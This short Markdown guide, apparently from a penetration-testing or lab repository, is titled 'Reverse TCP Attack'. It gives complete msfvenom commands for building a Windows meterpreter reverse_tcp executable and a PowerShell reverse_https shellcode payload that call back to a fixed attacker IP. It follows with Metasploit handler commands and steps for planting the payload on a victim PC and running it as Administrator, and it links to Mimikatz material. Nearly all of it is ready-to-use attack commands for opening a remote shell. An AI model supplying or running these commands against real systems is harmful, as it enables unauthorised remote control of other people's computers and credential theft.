# Reverse TCP Attack

Follow the below instructions to conduct an attack on a victim PC using a Reverse TCP payload

## Create Windows Binary Payload

The below instructions explain how to create a Windows Binary Payload that can be used to drop on a victim client.

1. On the Attacker Client where Metasploit is installed open a command prompt
2. Run IPConfig to obtain the IP address of the attacker client
3. Then Run the following command

    ```batch
    msfvenom.bat -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.18.48.21 LPORT=4444 -f exe -o C:\Payloads\Payload3.exe
    ```
4. The generated payload is stored in c:\Payloads\


## Create Windows PowerShell Payload

The below instructions explain how to create a PowerShell Payload that can be used to drop on a victim client.

1. On the Attacker Client where Metasploit is installed open a command prompt
2. Run IPConfig to obtain the IP address of the attacker client
3. Then Run the following command

    ```batch
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.18.48.21 LPORT=444 EXITFUNC=thread -f ps1 -o c:\Payloads\Invoke-Shellcode.ps1
    ```

4. The generated payload is stored in c:\Payloads\

## Start Metasploit Handler

Within the Metasploit Console enter the following commands:

```batch
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.18.48.21
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

To list the sessions type
sessions -l

to start interacting with the remote client type
sessions -i 1

## Victim PC

1. Copy the payload executable from the attacker PC to the victim PC.
2. Launch the previously generated payload.exe as Administrator3.

## Post Activities

to be defined

## Resources

- [Creating Metasploit Payloads](https://netsec.ws/?p=331)
- [Mimikatz](https://www.offensive-security.com/metasploit-unleashed/mimikatz/)
- [How to Attack Windows 10 Machine with Metasploit](ttps://resources.infosecinstitute.com/how-to-attack-windows-10-machine-with-metasploit-on-kali-linux/#gref)
